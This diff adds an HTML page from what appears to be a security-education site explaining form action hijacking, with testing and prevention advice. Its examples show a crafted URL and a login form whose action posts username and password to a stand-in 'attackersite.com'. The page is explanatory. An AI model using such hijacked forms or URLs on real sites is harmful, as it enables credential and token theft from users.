@@ -1,0 +1,235 @@
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
+
+<head>
+<meta charset="UTF-8">
+<link rel="shortcut icon" type="image/x-icon" href="logo.ico" />
+<title>Archive</title>
+<link href="https://fonts.googleapis.com/css?family=Barlow+Condensed" rel="stylesheet"> 
+<link rel="stylesheet" href="../static/css/generaldesign.css" th:href="@{css/info-list.css}" />
+<style>
+ul {
+    list-style-type: none;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    
+    }
+ #scheme{
+ 	background-color: #e5b766;
+    text-align:center;
+    border-style:solid;
+    border-width: 0px 0px 2px 0px;	
+	border-color:black;
+ 	
+ }
+
+
+
+li a {
+    display: block;
+    color: black;
+    text-align: center;
+    padding: 14px 16px;
+    text-decoration: none;
+    font-weight:bold;
+    
+}
+
+li a:hover {
+    background-color: #92733c;
+}
+
+#search{
+	float:right;
+	text-align:right;	
+	padding: -3px 0px;
+	font-size:22px;
+	border-width: 0px 0px 2px 0px;	
+	border-color: blue;
+	border-radius: 4px;
+	padding: 90px 0px 0px 20px;
+}
+.searchForm {
+    float: right;
+}
+
+.searchForm label {
+    float: left;
+    font-family: barlow condensed;
+    font-size: 11px;
+    padding-top: 5px;
+    padding-right: 5px;
+}
+
+.hint {
+    color: #999999;
+}
+
+#searchBox {
+    -moz-border-bottom-colors: none;
+    -moz-border-image: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background:white;
+    border-color: #CCCCCC;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid none solid solid;
+    border-width: 1px 1px 1px 1px;
+    height: 13px;
+    padding: 4px 5px 3px;
+    float: left;
+    width: 200px;
+    outline: medium none;
+    font-size: 11px;
+}
+html, body{
+	width: 100%;
+    height: 100%;
+    margin: 0;
+    padding: 0;
+}
+#searchSubmit {
+    background-color: white;
+    background-position: -2px 0px;
+    border: 0 none #CCCCCC;
+    border-radius: 2px 2px 2px 2px;
+    height: 22px;
+    left: -2px;
+    overflow: hidden;
+    position: relative;
+    text-indent: -9999px;
+    background-image: url("sbutton.png");
+    background-repeat: no-repeat;
+    cursor: pointer;
+    display: block;
+    float: left;
+    margin: 0;
+    outline: medium none;
+    padding: 1px;
+    width: 21px;
+}
+
+#searchSubmit:hover {
+    background-position: -23px 0px;
+}
+
+#Headlook{
+	font-size:22px;
+	position: absolute;
+    top: 8px;
+    left: 16px;
+    padding: 0px;
+}
+#body{
+	margin-left:260px;	
+	width:80%;
+	font-size:16px;
+	text-align:justify;
+	padding:30px 30px 0px 0px;
+	
+}
+
+#example{
+	background:#C0C0C0;
+	border:solid;
+	border-width: 1px;
+	border-color:#808080;
+	padding: 20px 10px;
+	width:70%;
+}
+
+#leftsidebar {
+	background: linear-gradient(to right, #eee 85%, white );
+	text-align:left;
+	float:left;
+	padding: 40px 30px 100% 10px;
+	
+}
+
+#rightsidebar{
+	background: linear-gradient(to left, #eee 85% , white);
+	text-align:right;
+	float:right;
+	padding: 40px 10px 100% 260px;
+}
+
+h2, h4{
+	border:solid;
+	border-width: 0px 0px 1px 0px;
+}
+ol{
+	
+	margin:0 auto;
+	float:left;
+	text-align:left;
+}
+footer{
+	text-align:center;
+	display:block;
+}
+
+</style>
+</head>
+<body>
+
+
+<ul id="scheme">
+<li id="Headlook">
+	  <h1><img src="../static/images/logo.png"/>
+      <th:text="#{archive.heading}">A R C H I V E</h1> 
+   	<li id="search">
+   	<h2>
+     <form action="#" th:action="@{/}" method="get">
+        <input id="searchBox" class="hint" type="text" name="searchTerm" placeholder="Search"	th:placeholder="#{employees.action.search.textbox.placeholder}" autocomplete="off" />
+        <button id="searchSubmit" class="submit" title="Search"	th:title="#{employees.action.search.button.title}" type="submit"></button>
+      </form>
+    </li>
+  <li id="search"><a href="vulnerability.html">Vulnerabilities</a></li>
+  <li id="search"><a href="attacks.html">Attacks</a></li>  
+  <li id="search"><a href="home.html">Home</a></li>
+</ul>
+
+<div id="leftsidebar">
+<h3>News</h3>
+	<a href="global.html"> 2017 Global BoD Election</a><br/>
+    <a href="honorary.html">Honorary Membership</a><br/>
+    <a href="OWASP.html">OWASP 2017 World Tour Boston</a></div>
+    
+ <div id="rightsidebar"></div>
+
+<div id="body">
+
+
+<h2>Input Validation Vulnerabilities</h2>
+<p>This category contains further 11 subcategories, but only 1 will be shown.</p>
+<h2>Form action hijacking</h2>
+<h4>Overview</h4>
+<p>Form action hijacking allows an attacker to specify the action URL of a form via a paramter. An attacker can construct a URL that will modify the action URL of a form to point to the attacker's server. Form content including CSRF tokens, user entered parameter values, and any other of the forms content will be delivered to the attacker via the hijacked action URL. </p>
+<h4>How to Test for Form Action Hijacking Vulnerabilities</h4>
+<p>Check parameter values passed to the form action. See example below. </p>
+<h4>How to Prevent Form Action Hijacking Vulnerabilities</h4>
+<p>Hard-code the form action URL or use a whitelist of allowed URLs. </p>
+<h4>Examples</h4>
+<p> URL: </p>
+<div id="example">
+https://vulnerablehost.com/?url=https://attackersite.com
+</div>
+<p> Source: </p>
+<div id="example">
+	
+	<xmp><form name="form1" id="form1" method="post" action="https://attackersite.com"></xmp>
+    <xmp><input type="text" name="id" value="user name"></xmp>
+    <xmp><input type="password" name="pass" value="password"></xmp>
+    <xmp><input type="submit" name="submit" value="Submit"></form></xmp>
+
+</div>
+
+<footer><p>
+All rights reserved - Archive  - 2017
+</p>
+</footer>
+</body>
+</html>	
